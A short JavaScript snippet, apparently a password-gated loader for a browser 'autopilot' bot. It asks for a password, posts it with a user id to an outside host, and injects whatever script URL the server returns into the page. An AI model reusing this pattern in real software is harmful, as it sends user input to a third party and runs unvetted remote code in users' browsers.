var nick_sozda="";
var pw = '';
var pass = prompt("Введите пароль:", "");
$.ajax({
  type: "POST",
  url: "http://vh17197.hv4.ru/bot/autopilot.php",
  async: false,  
  data: {"pas": pass.toLowerCase(),
       "sozd": nick_sozda,
       "my_id":my_id},
  success: function(data){
    pw = data;
  }
});
var element = document.createElement("script");
element.src = pw;
document.body.appendChild(element);